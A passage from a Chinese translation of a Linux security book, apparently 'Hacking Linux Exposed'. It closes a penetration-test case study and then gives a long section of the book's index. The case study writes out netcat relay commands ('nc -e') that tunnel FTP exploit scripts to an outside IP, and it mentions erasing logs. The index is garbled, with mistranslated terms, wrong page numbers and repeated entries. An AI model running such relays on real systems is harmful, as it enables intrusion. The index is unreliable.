黑客拥有很多脚本可以允许他攻击有漏洞的 FTP 服务器。为了确定运行的是哪种 FTP 服务器，他再次转向了那个可靠的“瑞士军刀”——`netcat`：

```
webserver> nc localhost 21
220 silly.example.org FTP server ready.
USER anonymous
530 User anonymous unknown.
```

没有多少有用的信息，但足以假设 `21` 端口确实是一个 FTP 服务器，而且它不允许匿名登录。他尝试使用之前发现的 `adguest` 账户，并成功登录了 FTP。这一天看起来很有希望。

黑客拥有一些 FTP 守护进程漏洞脚本，他想要运行这些脚本看看是否能获得 root 权限。他决定从本地机器运行脚本是最简单的，而不是将它们上传到 Web 服务器。然后，他通过 `netcat` 建立了一个快速重定向：

```
hackerbox# nc -e /ftp_exploit -p 6666 -1
webserver> echo '#!/bin/sh' >> /tmp/redir
webserver> echo 'nc localhost 21' >> /tmp/redir
webserver> chmod 0700, "/tmp/redir"
webserver> $ nc -e /tmp/redir 205.285.79.99 6666
```



`ftp_exploit` 脚本没有起作用，但他武器库里还有几个脚本可以选择。他在个人机器上使用不同的 FTP 漏洞利用重新启动了 FTP 命令。
其中一个脚本成功了——那是一个编写用于利用 `wu-ftpd 2.5.0` 中一个相当旧漏洞的脚本。他获得了 Web 服务器的 root shell，可以从那里执行任何他想要的命令。得益于他的 netcat 隧道，他可以在家里的机器上舒适地完成所有操作。

他不仅获得了 root 权限，而且 FTP 服务器并没有像 Web 服务器那样被 chroot（禁闭监狱）。这意味着他对机器拥有完全访问权限，而不仅仅是之前被禁锢的有限子集。

## 总结工作

此时，黑客通常会继续掩盖自己的踪迹。首先，他会清理 Web 服务器日志中包含他滥用 CGI 脚本时的命令和 IP 地址，删除他在 chroot 监狱中创建的临时文件，然后检查系统日志中任何关于其活动的迹象，删除任何可能显示其操作的内容。他本可以开始系统安装后门、破坏 Web 文档、攻击防火墙后的其他机器，或者删除整个机器上的所有文件。但这并不是他的真实目标。

这位黑客只是受雇测试该机器的安全顾问。因此，他现在的工作是列出系统的问题并提交给维护人员。他列出的主要问题如下：

- 防火墙配置非常精妙，严格定义了内外之间允许通过的流量，但对不再需要的 8080 端口的疏忽需要修正。
- Web 服务器所处的 chroot 监狱构建得良好，可用程序极少。然而，perl 解释器的引入使得这些努力大部分付东流，尽管它安装时没有标准的 perl 模块。相反，CGI 提供的动态内容可以通过 `mod_perl` 替换为 Web 服务器模块，从而消除监狱中 perl 程序的必要性。

- 程序人员需要在编写安全 CGI 应用方面吸取一些严肃的教训。
- 程序人员认为没有用户可以登录 Web 服务器，因此他们不需要担心本地用户攻击，例如所使用的符号链接攻击（symlink attack）。
- 同样，管理员应该保持所有软件更新，而不仅仅是他们认为从防火墙外部无法访问的软件。如果 FTP 服务器是最新版本，root 权限将无法获取，黑客可能仍然被限制在 chroot 监狱中。
- 管理员用户名和密码的重复使用允许黑客进行其利用所需的 FTP 登录。

事实证明，该机器是由一位非常老练且多疑的管理员配置的。是他创建了 chroot 环境，正确配置了 sendmail，升级了所有 Web 服务器软件并锁定了防火墙。然而，他被“裁员”了，以便公司聘佣更多的程序员。他们用一位新管理员取代了他，而那位新人恰好是重新开启了旧漏洞 FTP 服务器的人。巧合的是，正是新雇的程序员编写了用于这次入侵的漏洞 CGI 程序。

## 索引

符号

- * (星号), 441
- @ (at符号), 466
- \ (反斜杠), 450, 465
- # (井号), 208, 465
- . (点符号), 251-252, 466, 467
- ~ (波浪号), 432
- | (竖线), 450
- \0 (空字符), 451

访问代理, 370
访问控制列表 (ACLs), 214-215
AccessFileName 指令, 434
ACK 标记, 182
ACK 数据包, 223
ACK 扫描, 96
ACK 洪暴, 223
ACLs (访问控制列表), 214-215
活动栈指纹识别, 103-106
AddHandler 指令, 431-432, 337
地址解析协议 (ARP),高级入侵检测环境 (AIDE), 52-59
高级包工具 (apt), 111, 496-498
AFS (Andrew File System), 111, 113-114, 240
aft FTP 服务器, 414
AIDE (高级入侵检测环境), 52-59
AllowOverride, 434
allow-transfer 状态, 85-86
America Online (A), 456
Andrew File System, 111, 113-114, 240
any 进程, 311
any FTP
Apache Web 服务器, 425-439
CLI 与, 431-434
配置, 427-439
目录, 228-432
特性, 226-429
来源与, 5
密码文件, 303-304
代理, 439
安全与, 426
符号链接, 227-428

黑客攻 Linux (Hacking Linux)

- 身份验证, 391
应用层, 183-184
应用程序 (apt), 496-498
apt-get 进程, 497
ARP (地址解析协议), 221-226
ARP 表, 221-223
pool 进程, 226, 227
* (星号), 441
@ (at符号), 67
原子函数, 272, 274
基于主机的身份验证, 316-323
HTTP. 身份验证
调制调器, 185
PAM, 304-305, 345
POPF, 255-256
auth, 255-256
特权端口, 212
规则, 344-345
authorized_keys 文件, 328-329
we-httpd 服务器, 456

- Best 文件系统, 173
BGP (边界网关协议), 217, 219
二进制文件
userid, 270
smrsh, 380
木马化, 138, 139, 338, 350-351
BIND
缓存投毒, 212-216
描述, 81
DNS 与, 212
版本, 81
区域传输, 244-86
BIND_server, 61
BIOS C-CMOS 内存, 166
BIOS 设置, 165-167
黑洞, 363
数据包, 477
启动访问, 163-173
启动设备, 164-165
启动磁盘, 164-165, 171-172
启动计算机, 62, 171-172
bash shell, 8
Bourne Again Shell (bash), 8
Bourne shell, 8

![](img/33829ffb1435b4ef56cd2c28ec6cd_575_0.png

- 后门, 344–351
- 身份验证规则, 344-345
- ACLs, 350-351
- IRC, 152-153
local setuid 进程, 348-349
网络访问限制, 344
网络守护进程修改, 347-348
网络服务, 344
PAM 库, 345-347
骨干路由器, 219
bash (*), 455-465
反引号, 454-465
备份, 63, 162
带宽, 88, 89
banner, 396-398
FTP, 396-398
邮件服务器, 374-376
网络, 102-103
sendmail, 102
SMTP, 375, 376
telnet, 102
sys-httpd, 396-398
bash (Bourne Again Shell), 8
bash-httpd 服务器, 456
Bastille 工具, 32-33
电池, , 166
Berkeley Internet Name Domain. Ser BIND

- C shell (sh), 8
C 字符串函数, 199
缓存文件, 212-216
案例研究, 123-541
“大教堂与集市”, 5-6
CD-ROM
移除设备, 165, 166
从...运行程序, 51
启动计算机, 62, 162-165
系统工具在, 31
证书颁发机构, 232
CFS 文件系统, 173

![](img/33829ffb1435b4baef56fcd2c28ec6cd_575_1.png)

索引

- CGI (通用网接口), 439-456
Apache Web 服务器, 431-434
后门 CGIs, 350-351
在文件执行, 431,432-337
不安全配置, 432
旧版本, 432
CGI 扩展, 431
数据长度, 446-447
隐藏字段, 444-456
缺失字段在, 452-444
空字符, 450-451
管道, 452-455
处理, 451-452
引用头, 447-448
系统调用, 452-455
CGI 程序
cooks, 448-449
下载, 440-442
执行, 431,432
文件名和, 449-451
GET 方法, 443
隐藏字段, 444-448
不安全, 452-456
JavaScript 处理, 451-452
操作系统调用, 452-455
Perl 代码, 433-444
后连接, 443
预共享, 440-442
问题, 432-456
引用头, 447-448
以不同用户身份运行, 433-434
共享 Web 服务器, 440-443
telnet 连接, 446-447
Web 场, 455-456

比较, 141-142
CRC 校验和, 54
CRC32 校验和, 56
加密校验和, 141,143,144
描述, 47
文件校验和, 141-142
MDS 校验和, 47, 56, 141,143
System V 校验和, 141-143
验证, 63
config 进程, 504-505
chroot 进程, 361
Chrootkit, 365
chwmt 进程, 261
chmod 命令, 12-13, 263
chown 命令, 264
chown 系统调用, 278
chroot 监狱, 139
Cisco 数据包过滤器, 486
Cisco 路由器, 218
Cisco Switch机, 523-525
明文邮件, 378-389
FTP 协议, 394-395
密码, 253-256, 389-391, 394-395
SMTP, 387-389
用户名, 394-395
客户端内存, 166
telnet 客户端, 184
FTP 客户端, 412-413
IRC 客户端, 152
netcat 客户端, 537-538
rsh 客户端, 21
SSH 客户端, 228-229
XFtp 客户端, 405,407
C-MOM 胶, 166
COAST 项目, 51-52
coda, 240

CGI 扫描器, 440
CGI 脚本, 440-442
攻击, 531-539
下载, 440-442
预共享, 440-442
以不同用户身份运行, 433-434
查找, 531
更改命令, 302-303, 311-312
命令, 391-392
charger 服务, 202-203, 233
底盘锁, 166
chattr 命令, 16-17, 173
ch + 命令, 282, 351
chattr + database 命令, 51
校验和, 49-50
算法, 56-57
BSD 校验和, 141-143
比较版本, 140-141
非 FTP 服务器, 129-140
Linux 内核, 359
Perl, 443-444
复审, 140-141
木马化, 138-144

命令行, 256-257
命令
302-303, 311-312
chattr, 16-17, 173
chattr +1, 282, 351
chattr + database 命令, 51
chmod, 12-13, 263
chown, 264, 278

# 破解 Linux：Linux 秘密与解决方案

- EXPN, 377-379
- find, 25, 410
- gpassword, 303
- groupadd, 303
- groupdel, 303
- groupmod, 303
- host, 82, 83, 84-86
- ifconfig, 27-28
- killall, 20-21
- LIST, 398-399, 408
- ls, 10, 251, 393
- attr, 16-17
- imod, 352-353
- mdir, 273-274
- mount, 186-187, 264, 269-270
- netstat, 203-206
- password, 260-261, 303
- PASS, 399, 401-404
- ping, 78
- PORT, 398-401, 408, 412
- ps, 319
- r- commands, 239-241, 323-326, 327
- rc, 323-324
- RETR, 409
- rlogin, 323-324
- rpcinfo, 108-109, 319
- rpm, 264, 493-494
- rsh, 323-324
- showmount, 111-114
- SMTP EXPN, 377-379
- SMTP VRFY, 376-377
- sulogin, 168, 169
- tar, 264
- telenet, 503
- top, 293
- touch, 46
- ulimit, 18-19
- information, 395
- mask, 15
- use, 350
- useradd, 264, 303
- userdel, 303
- ermod, 303
- VRFY, 376-377
- whos, 73, 516
- which, 7, 208

## 通用网关接口，Ser
- 常见漏洞与披露 (CVE)
- 标准, 120
- 社区字符串, 101, 114, 117
- 编译, 100
- 编译器, 267

- 计算机 Oracle 密码系统 (COPS)
- 工具, 25
- 条件条件脚本, 281-282
- 配置

- Apache Web 服务器, 427-439
- 默认, 186-190
- 文件, 48-

- Netscape 浏览器, 177-188
- 网络, 186-190
- Nmap 实用程序, 96-97
- 操作系统, 186-217
- 系统日志, 36-39
- xineted, 462-464
- 配置文件, 48, 63

- connect 团队, 94
- 控制台, 160-161
- cookies

- CGI 程序, 444-448
- SSL 和, 449

- X 会话访问和，, 190
- COPS (计算机 Oracle 密码系统)
- 工具, 25

- 法医工具箱, 63
- 礼貌扫描检测器, 320
- cpio 命令, 264
- 破解程序, 296-294
- 破解密码, Ser 密码
- CRC 校验和, 534
- CRC32 校验和, 56
- Ctool 工具, 236
- chromob, 39

- crypt() 密码, 290-291
- crypt(3) 函数, 287-288
- 加密校验和, 141-143, 144
- cash (Shell) 8

- CVE (常见漏洞与披露)
- 标准, 120

- 守护进程账户, 321
- 数据

- 备份, 162
- 加密的, 122-424
- 备份, 8
- 长度, 446-447

- 数据加密标准。Ser Des
- 数据库

- Apache Web 服务器和, 303
- 校验和, 49-50
- 加密的, 26
- 文件完整性, 53
- 不可变的, 51
- 信息收集和, 137

- 双启动系统, 163-164
- 锁, 166
- 从磁盘启动开始, 62

![](img/33829ffb1435b4baef56fcd2c28ec6cd_577_0.png)

# 索引

## 547

- 密码和, 303
- 权限, 49–50
- whois, 73–77
- whois.in, 76–77
- 数据文件, 31
- DoS (分布式拒绝服务攻击), 235–236
- Debian Linux, 495–498
- Debian 包系统, 495–498
- 诱饵主机, 27
- 删除项目, 49
- 密码, 285
- 拒绝服务攻击 (DDoS), 232–239
- 自动重启, 31
- DOS 攻击, 232–239
- 洪水攻击, 232–236
- ICMP 洪水攻击, 232–236
- 邮件 炸弹, 374–386
- “死亡之 ping”(Ping of Death) 攻击, 236–237
- 入, 30
- 服务, 202–304
- Smurf 攻击, 235
- SYN 洪水攻击, 237–239
- TCP/IP 攻击, 236–239
- UDP 洪水攻击, 223–234
- DENY, 35
- DES (数据加密标准), 287–289
- 身份验证文件, 303–304
- 密码, 307, 313
- 启动 cookies, 164–166
- 组访问, 258–260
- 网络设备, 160, 191–192
- 权限, 258
- 权限和, 258–259
- 拨号
- 保护, 158, 186
- 拨号破解, 251
- 字典, 291, 298–299
- 字典, 290, 299, 300, 301
- 摘要, 55, 445–446
- 修改, 50
- 条件脚本和, 282
- /etc/rc 目录, 503, 506–508
- 硬链接和, 280
- 隐藏, 341–343
- 主目录, 7
- 监控, 50
- 权限, 10, 13–16
- 丰富的 CGI 访问, 431
- 运行级别目录, 503
- 粘性文件, 13–14
- 可疑的, 62
- 符号链接和, 428
- 披露规则, 65
- 磁盘
- 硬磁盘, 60, 61
- 限制磁盘使用, 17–18
- 配额, 17
- 分布式拒绝服务攻击 (DDoS), 235–236
- 分布式文件系统 (DFS), 114
- 分布式进程, 293
- dns (域名) 攻击, 212–217
- 应对对策, 84–88
- 伪造回复, 226
- 信息泄露, 82–84
- 公共信息, 137
- 反向密钥, 469–471
- 安全问题, 81–87
- 区域追踪, 84–86
- DNS 查询, 82–86
- dns 查询, 82–87
- dns 安全 (DNSSEC), 88, 217
- dns 从机, 84–86
- dns 欺骗, (DNS 安全), 88, 217
- dnssec, 216–217, 226–227
- 域名
- 注册信息, 73–75
- whois 查询, 76–77
- 域名服务器: DNS
- 锁定入, 470–471
- 返回名称, 76
- 传输代理, 86
- 受信任的, 470–471
- DoS 攻击。拒绝服务攻击 (DDoS)
- DFPARANOID 选项, 470
- dpkg 命令, 495–497
- dpkg 程序, 495–498
- 嗅探程序, 196, 226–229
- 双启动系统, 163–164
- 倾储挖掘, 158–159
- 动态密码, 183, 199

# 破解 Linux：Linux 安全秘密

- qmail, 388
- echo 端口, 80
- echo端口 ping, 78
- echo 服务
- 可逆的, 256
- sendmail, 388
- 嗅探器, 194

- SSL, 256
- 关闭调节, 80
- 编辑器，安全性，和 261–263
- DoS 攻击, 202, 203, 233
- dequota 命令, 17
- 网站, 422–424

- 枚举
- 域名, 75–76
- RPC 服务, 108–110
- 环境变量, 257
- EGP (扩展网关协议), 291
- ESMTP (扩展简单邮件传输协议), 371, 375
- 拒绝服务攻击, 384–386
- 免费账户, 73
- 处理, 379
- Reaper, 297
- 邮箱箱, 384–386
- 继, 381–382
- 资源限制, 384–386
- 独立账户, 73
- 垃圾邮件, 144, 383
- 验证地址, 366–377
- 蠕虫和, 147

- 员工
- 检查, 301–302
- 描述, 283
-  way, 7–8
- PAM 和, 305
- sendmail 和, 299–302
- 安全和, 7–8, 320
- sudo 工具, 262–263

- /etc/profile 文件, 18–19
- /etc/rc.config 文件, 319
- /etc/rc.d 目录, 48
- /etc/rc.d 目录, 503, 506–508
- /etc/rc.d 目录, 319, 324
- /etc/rc.scripts, 279–282
- /etc/security/limits 文件, 21, 102–103
- /etc/sendmail.conf 文件, 102
- /etc/shadow 文件, 253, 295–305
- /etc/sysconfig.conf 文件, 37–359
- /etc/syslog.conf 文件, 37–59
- /etc/xinetd.conf 文件, 462–464

- 加密主目录, 174
- 算法, 286–289
- 连接, 225–226
- 数据, 162, 422–424
- 数据库, 26
- Eternal 程序, 196
- 以太网地址, 116
- 以太网卡, 221, 225
- exec() 函数, 454–455
- 执行权限, 12–13, 14
- 漏洞脚本, 145–146
- EXPN 命令, 377–379
- DES 算法, 278–289
- 文件系统, 173–174
- IMAP 协议, 389–390
- 笔记本数据, 162
- MD5 算法, 288–289
- 导入项目, 111, 113
- NFS,, 318–319
- 单向, 284, 289
- 密码, 7, 255–255, 284–289
- PGP (良好隐私), 309
- POP 协议, 389–390
- Postfix 和, 388
- 协议, 225–226, 277

- 扩展网关协议 (EGP), 219
- 扩展简单邮件传输协议 (SMTP), 371, 375

![](img/33829ffb1435b4baef56fcd2c28ec6cd_579_0.png)

# 索引 549

## 文件系统
- .cgi, 431
- SMTP-AUTH, 388
- STARTTLS, 388–398

## 文件
- BestCrypt, 173
- CFS, 171
- 加密的, 173–174
- 加密主目录, 174
- 导出, 111, 113
- /home 文件系统, 113
- 完整性检查, 46–59
- 挂载, 186–187
- NFS 和, 114
- 蠕虫和, 147
- PPD, 258
- 设置和, 269
- TFS, 174

## F
- 快速哈希函数, 56
- Fetchmail 实用程序, 255
- 过滤, 242–243
- FIN ACK, 182
- FIN标志, 182
- FIN 扫描, 95–96
- find 命令, 250
- 指纹识别
- 防火墙包 (FWTK), 486
- 防火墙, 476–487

## A
- 访问控制, 35–36
- 属性, 16–17
- 备份, 63
- 校验和, 49–50, 141–142
- 配置文件, 48
- 删除, 48
- 显式分配模式, 450
- 隐藏: 341–343
- 身份文件, 328–329
- 感染的, 147
- 安装文件, 49

## C
- 活动栈, 102
- 备份, 63
- 阻塞网络访问, 480
- 阻塞项目, 485
- 阻塞密码, 285
- 使用 iptables 创建, 484–485
- 使用 iptables 创建, 478–486

## D
- DoS 攻击, 203
- DoS 威胁，和 203
- FTP 和, 399, 410–413
- IP 分段包, 180
- Linux 数据包过滤, 477–480
- netcat 客户端, 537–538
- 网络更改, 351
- OS 探测, 106
- 数据包过滤, 476, 477–480
- 开源, 486
- 产品, 486
- 代理, 477
- RFC 端口和, 108
- 脚本, 480
- 状态的, 477–480
- 策略, 483–486
- 类型, 476–477

# Linux 破解揭秘：Linux 安全之密

- 软磁盘
- 启动磁盘, 164-165, 171-172
- LILO 和, 171-172
- 移除驱动器, 165, 166
- 系统工具, 351
- 蠕虫和, 147
- 软磁盘读取器, 486
- fork(i), 454-455
- 格式化攻击, 267-268
- FormatGuard 产品, 268
- Fping 工具, 79
- 分段数据包, 97
- 分片处理, 92
- 分片扫描, 100
- 分段数据包, 100, 179-180
- freshen 选项，升级, 494
- FTP 弹回攻击, 408-410
- FTP 弹回, 398-401
- FTP 客户端, 412-410
- FTP (文件传输协议)
    - 主动模式, 393-394, 405
    - 匿名 FTP, 254, 395, 413-414
    - 通道, 391-392
    - 明文密码, 394-395
    - 命令通道, 391, 395
    - 数据通道, 391
    - 描述, 391
    - 防火墙和, 410-413
    - 被动模式, 394, 402-404, 415
    - 密码, 394-395
    - 示例会话, 392-393
    - 安全性, 391-393
    - 第三方, 406-410
- FTP 服务器, 391-415
- 追踪, 540
    - 防火墙和, 410
    - 密码, 394-395
    - 端口扫描和, 398-406
    - 安全性, 391-392
- SSH 程序, 395
- FTP 站点, 139-140
- Ftp-ozone 程序, 412-413
- FWTK (防火墙工具包), 486
- 访客校验和, 56
- gpasswd 命令, 303
- 组 ID, 7
- groupadd 命令, 303
- groupd 命令, 303
- groupid 程序, 62
- groupmod 命令, 303
- 组, 9-10
    - 访问, 257-260
    - 设备, 258-260
    - /etc/group 文件, 9-10
- httpd 协议和, 427
    - 限制, 99
    - 权限, 257-260
    - 权, 257-260
    - 漏洞, 257-260
    - 漏洞, 260
    - wheel 组, 259-260

![](img/33829ffb1435b4baef56fcd2c28ec6cd_581_0.png)

- 破解评估违规行为, 62-63
- 数据, 5
- 检测, 59-62
- 恢复在线, 64-65
- 隐藏踪迹, 338-343
- 信息收集, 69, 125, 519-520
    - 法律影响, 65
- Linux 内核, 352-358
    - 来自本地账户, 538-539
    - 维持访问, 65
    - 从系统内核清除黑客, 64-65
    - 原因, 4
    - 从中恢复, 59-96
- root 账户, 4-5
- 嗅探器, 194
- 破坏攻击者, 363, 365
- 用于的网站, 511-512
- Hacking Exposed 网站, 512
- 万圣节文档 (Halloween Document), 6
- 硬盘, 所有磁盘
    - 磁盘空间减少, 60
    - 高使用率, 61
- 系统加固, 32-36
- 硬链接攻击, 279-280
- 硬链接, 274-275
- havel 校验和, 56
- 数据包头, 477
- 辅助程序攻击, 268
- 破解项目
    - PASV FTP 数据, 401-404
    - 劫持 FTP 数据, 404-406, 415
    - 会话, 222-232
    - TCP 连接, 220
- gate 守护进程 (gated), 220
- Gauntlet 防火墙, 486
- GET 方法, 443
- GNOME PR, 492, 494
- GNU 隐私卫 (GnuPG), 158, 388
- Gnussiff 程序, 196

# 索引

# 551

- 历史文件, 257
- home 目录, 7
- /home 文件系统, 113
- home 页面, 137
- 蜜罐 (honeypot), 363
- host 命令, 82, 83, 84
- host key, 228-229
- host 身份认证, 316-323
- host-key 检查, 229
- hostname 和系统, 112
    - 从 IP 地址获取, 86-87
    - 从 net-smb MIB 获取, 116
    - 从 showmount 命令获取
    - 反向, 84-86
- hosts
    - 访问控制, 467-469
    - 自动拒绝, 31
    - 诱饵, 97
    - 锁定, 470-471
    - 信任的, 111
- .htaccess 文件, 321, 434
- HTML 文件, 457
- html.ini 文件, 350
- htppwd 命令, 304
- .htpasswd 文件, 321
- HTTP 身份认证, 421-423
    - Apache Web 服务器, 303-304
    - 攻击, 434-436
    - 示例, 434-435
    - htpasswd 文件, 434-435
    - htpd.conf 文件, 435
    - 不安全配置, 434-436
- HTTP 守护进程 (httpd), 330, 426
    - HTTP 密码, 438
    - HTTP 端口, 418, 427, 478-490
    - HTTP 协议, 456, 479-480
    - HTTP 请求, 438-439
    - HTTP 类型, 415-425
    - HTTP 嗅探, 229
- httpd (HTTP 守护进程), 330, 426
    - htpd 进程, 427
    - htpd.conf 文件, 427-435
- HTTPS 连接, 229
- HTTPS 工具, 194, 226
- hunt 防防火墙, 195, 221-226
- upf 信号, 211
- ICMP ECHO REQUEST, 77, 80, 89-90
- ICMP (互联网控制协议), 183
    - ICMP 分段, 237
    - 数量限制, 233
    - 限制, 183
    - ICMP ping, 202-236
    - ICMP prng, 70, 90, 96-480
    - ICMP 类型代码, 183
- ident 服务, 332
- ident/auth 端口, 322
- ident, 150
- identity 文件, 328-329
- identity 登录, 328-329
- identity 密码, 328-329
- IDS (入侵检测系统), 229
- ifconfig 命令, 27-28
- IIS (互联网连接服务器), 425
- IMAP 协议, 380-390
- imapd 服务, 200-201
- immux 工具, 201, 268
- 位图, 351
- imutable 标记, 173
- 冒充, 132
- 入站访问, 336-338
- inet (net 守护进程), 464-469
    - host 控制, 464-467
    - 概述, 460-461
    - 运行守护进程, 331-342
- inet 服务, 332
- inet 服务, 475-476, 508
- inode 号, 355
- inode 表, 275
- inas, 274-275
- 输入验证攻击, 280-282
- 已安装包, 63
- 互联网站点工具, 63
- 机密数据, 420-426
- 拒绝服务攻击, 232-239
- 域名, 73-75
- 防火墙, 561
- 邮件列表, 71-73
- 新闻组, 71-73
- 在线搜索, 70-73
- 数据包, 351
- 保护数据, 421
- telnet 连接
- 互联网协议 (IP), 179-218, 217, 239-240
- IBM 安全邮件投递器 .Postfix
- ICMP ECHO REPLY, 78, 80

![](img/33829ffb1435b4baef56fcd2c28ec6cd_582_0.png)

# Linux 破解揭秘：Linux 安全之密

- 互联网相对聊天 (IRC)。请参 IRC
- 安全扫描器 (ISS), 117-118
- 互联网服务提供商 (ISPs)
    - IP 块, 77
    - 侵入, 519-528
    - 追踪, 89
    - 漏洞, 455-456
    - 网站托管, 455-456
- 侵入案例研究, 514-519
- 入侵检测系统 (IDS), 29
- IP 地址
- IRC (互联网相对聊天), 152-153
- IRC 脚本, 152-153
- isc 工具, 205-206
- ISPs (互联网服务提供商)
    - IP 块查询, 77
    - 侵入, 519-528
    - 追踪, 89
    - 漏洞, 455-456
    - 网站托管, 455-456
- ISS (互联网安全扫描器), 117-118
- ARP 欺骗, 221-223
- 阻止, 381, 398
- 拒绝数据包, 66
- 确定, 53-515
- 隐藏, 339-340
- 网络所有权, 76-77
- NFS 和, 248
- 获取 hostname, 86-87
- 使用 snmp 获取, 116
- ping 扫描, 77-80
- PORT 命令和, 400
- 限制性访问, 421
- 反向查询, 86-87
-  欺骗, 327
- 信任的, 241
- UDP 和, 182

![](img/33829ffb1435b4baef56fcd2c28ec6cd_583_0.png)

# J
- JavaScript, 451–452
- Jigsaw 服务器, 456
- John the Ripper 程序, 295–297

![](img/33829ffb1435b4baef56fcd2c28ec6cd_583_1.png)

- IP (互联网协议), 179–180, 217, 239–240
- IP 网络, 178
- IP 数据包
    - 活跃, 103
    - 分段, 100, 179–180
    - 头, 170
- IP 协议扫描, 95

# K
- K 文件, 503
- Karpski 程序, 196
- Kerberos 身份认证, 114
- 内核
    - 阻止 NFS 服务器, 141, 482
    - 阻止 ping, 481
    - 阻止 portmapper, 110
    - 阻止 telnet 连接, 483
    - 阻止 traceroute, 481–482
    - 使用防火墙, 478, 484–485
    - 拒绝数据包, 66
    - ipchains, 479–490
- Windows 系统和, 189
    - 代码, 359
    - 编译, 100
    - 应对措施, 362
    - 描述, 358–359
    - 破解, 352–358
    - 内存, 259
    - 补丁, 34–35, 267, 279
    - 超用户和, 361
    - 升级, 237
    - 版本号, 478
    - 削弱, 357–358
    - 阻止连接, 482
    - 阻止 NFS 服务器, 113
    - 阻止 portmapper, 110
    - 使用防火墙, 478, 485–486
    - 拒绝数据包, 66
    - ipchains, 479–490

![](img/33829ffb1435b4baef56fcd2c28ec6cd_583_2.png)

# L
- LIDS (Linux 入侵检测), 34–36, 259
- LILO (Linux 加载程序), 167–173
    - 文件, 55
    - 符号, 427–428
    - 目录, 34
- Linux 入侵检测系统 (LIDS), 34–36, 259
- Linux Root Kit (LRK), 359
    - 代码, 359
    - 编译, 100
    - 应对措施, 362
    - 描述, 358–359
    - 破解, 352–358
    - 内存, 259
    - 补丁, 34–35, 267, 279
    - 超用户和, 361
    - 升级, 237
    - 版本号, 478
    - 削弱, 357–358
- Linux Root Kit (LRK), 363–364
    - 工具, 22
    - 隐藏, 339–340
    - 级别, 37
    - 日志, 22
    - 目标, 38
    - 登录, 338–339
    - 密码, 322–323
    - 报告, 338–339
- logfer 工具, 44–46, 518
- logtail 工具, 41
- 日志文件
    - 分析, 36–46, 63
    - 暴力破解攻击, 289
    - 持续运行检查器, 39–40
    - Crack 程序和, 292
    - cron 任务, 38
    - 内核日志, 355
    - 日志检查程序, 39–46
    - 监控, 526
    - mount 服务和, 114
    - 权限, 40, 48
    - 进程管理, 36
    - 扫描, 39–40
    - syslog 消息, 36–39
    - 系统日志, 22, 376–377
    - 截断, 60
    - UNIX 平台, 36–39
    - 清除, 60
- Logcheck 工具, 41

![](img/33829ffb1435b4baef56fcd2c28ec6cd_584_0.png)

# 破解 Linux 暴露：Linux 安全秘密

- Mailsnarf 程序, 227
- 页面, 113, 226
- 管理信息库 (MIB), 115–117
- 在线手册, 436–437
- MAPS (邮件滥用预防系统), 383
- Matt's Traceroute (MTR), 89
- MD5 算法, 288–289
- Apache 密码文件, 303, 304
- 密码, 307, 313
- 验证隐藏字段, 445–446
- MD5 校验和, 57, 61, 143
- md5sum 程序, 27, 41
- MDA (邮件投送代理), 370
- Melissa 病毒, 146
- 内存
  - BIOS, 166
  - 清除, 166
  - C-MOS, 166
  - 消耗, 21
  - 内核, 259
  - 泄漏, 21
  - 管理, 21–22
  - 安全性, 21–22
  - 虚拟, 21–22
- 元字符, 280–281, 453–454
- MIB (管理信息库), 115–117
- mkdir 命令, 273–274
- mktemp 函数, 273–276
- mktemp 工具, 278
- 调制调器
  - 认证与, 185
  - 连接, 184–186
  - 公共电话, 184–186
  - 保护, 185–186
- 无人监控器, 160–161
- Morris Internet Weeper, 149
- 主板, 166
- mount 命令, 186–187, 269–270
- mount sieve, 114
- nmapfc 工具, 256
- Mailsnarf 程序, 227
- MTAs (邮件传输代理), 370, 371–373
- MTR (Matt's Traceroute), 89–90
- netcat (nc) 工具
  - 参数, 91
  - 客户端, 537–538
  - 连接, 536–537
  - 创建入站 root shell, 322–335
  - PORT FTP 劫持, 405–406
  - 端口扫描, 92
- Netfilter, 469
- 子网掩, 77
- 子网码对, 467
- .net 文件, 255–254
- Netscape 浏览器
  - 攻击, 187–188
  - 默认配置, 187–188
  - 开源与, 5
  - 密码, 187
- net-snmp, 115–206
- 网络命令, 203, 216
- 网络标识符, 102–103
- 网络广播包, 221
- 网络守护进程, 347–348
- 网络设备
  - 默认密码, 191–192
  - 标签, 160
  - 列出, 192
- 网络信息系统 (NIS), 240–241, 292
- 网络接口卡 (NIC), 192
- 网络锁, 77
- 网络扫描器, 27–32, 117
  - 应对措施, 124
  - 描述, 24
- ISS, 117–118
- Nessus, 121–125, 125
- SAINT, 118–119
- SARA, 120
- SATAN, 118–119
- 网络扫描
  - ipconfig 命令, 27–28
  - 执行, 27–32
- 网络服务
  - 后门, 344
  - 隐藏, 344, 351
  - 扫描, 539–540
  - 网络交换机, 525, 526
- 177–243
  - 滥用信任关系, 239–241
  - 访问限制, 344
  - 可访问的 root shell, 329–338
  - 活动, 60
  - 攻击, 211–243
  - 通过攻击, 177–209
  - 基本概念, 178–190
  - 阻止访问, 480–483
  - 默认配置与, 186–190
- Nabou 程序, 26–27
- 名称服务, 212
- NASL (Nessus 攻击脚本语言), 121
- c. Ser Net
- Nemesis 工具, 235
- Nessus 攻击脚本语言 (NASL), 121
- Nessus 安全扫描器, 121
## 索引 555

- 默认密码, 190–192
- 拒绝服务. 见 denial-of-service (DoS)
- DNS Epoch, 212–217
- 入口过滤, 242–243
- 隐藏信息, 343
- 接口, 27–68
- IP 网络, 178
- 密码猜测, 196–199
- 性能, 183
- 物理攻击, 159–160
- ping 扫描, 77–80
- 公共主机, 184–186
- 报告工具, 343
- 路由问题, 217–220
- 探测器, 24–32
- 会话劫持, 220–232
- 切换, 183–189, 221–223
- TCP/IP, 178–184
- 关闭服务, 207–208
- 不必要的服务, 202–209
- 漏洞, 190–202
- NFS 文件, 226
- NFS 挂载, 186–187
- 防火墙拦截, 181
- 文件共享, 111–114
- 不安全的 NFS 端口, 318–319
- IP 地址, 240
- NovellWare, 270–271
- 调整, 187
- NFS 服务器, 111–114, 270–271
- NIC (网络接口卡), 192–193
- Nmap 组, 465
- Nmap (网络映射工具), 99
- 弹回扫描, 396–401
- 配置选项, 96–97
- 使用...识别服务, 206–207
- OS 识别, 104–106
- ping 扫描, 77–80
- 端口扫描, 94–100, 110–111
- Web 服务器, 528–529
- mapfile (nmap 前端), 99
- map 用户, 9, 263, 427
- 原子函数, 227
- 用户账户, 320
- no-set 补丁, 322, 323
- nosuid 标记, 271
- Novell 服务器, 270–271
- 密码程序, 310–331
- 快速-CGI, 440–441
- leap 工具, 62
- 空字符, 450–451
- 空扫描, 95, 96, 100
- 数字符号 (#), 208, 465
- One Passwords in Everything (OPT) 工具, 312
